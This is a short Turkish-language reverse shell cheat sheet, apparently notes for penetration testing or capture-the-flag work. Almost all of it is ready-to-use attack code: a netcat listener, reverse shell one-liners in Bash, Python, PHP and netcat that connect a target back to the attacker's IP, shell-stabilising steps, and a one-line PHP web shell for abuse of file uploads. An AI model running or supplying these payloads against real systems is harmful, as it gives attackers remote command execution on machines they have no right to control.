# Reverse Shell Cheatsheet

Hedeften kendi makinene bağlantı açtırma.

## Dinleyici Aç (Kendi Makinende)

```bash
nc -lvnp 4444
# -l  = listen (dinle)
# -v  = verbose
# -n  = DNS çözme (hızlı)
# -p  = port
```

## Reverse Shell Payload'ları

### Bash

```bash
bash -i >& /dev/tcp/<kendi_ip>/4444 0>&1
```

### Python

```python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<kendi_ip>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### PHP

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<kendi_ip>/4444 0>&1'"); ?>
```

### Netcat

```bash
nc -e /bin/sh <kendi_ip> 4444

# -e yoksa (bazı nc versiyonlarında):
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <kendi_ip> 4444 >/tmp/f
```

## Shell Aldıktan Sonra — TTY Upgrade

```bash
# 1. Python ile upgrade
python3 -c 'import pty;pty.spawn("/bin/bash")'

# 2. Background
Ctrl+Z

# 3. Terminal ayarla
stty raw -echo; fg

# 4. Environment
export TERM=xterm
export SHELL=/bin/bash
```

## Web Shell (dosya yükleme açığında)

```php
<!-- Basit PHP web shell -->
<?php system($_GET['cmd']); ?>

<!-- Kullanım: http://hedef/shell.php?cmd=whoami -->
```

## Kaynak

Tüm reverse shell one-liner'lar:
https://www.revshells.com
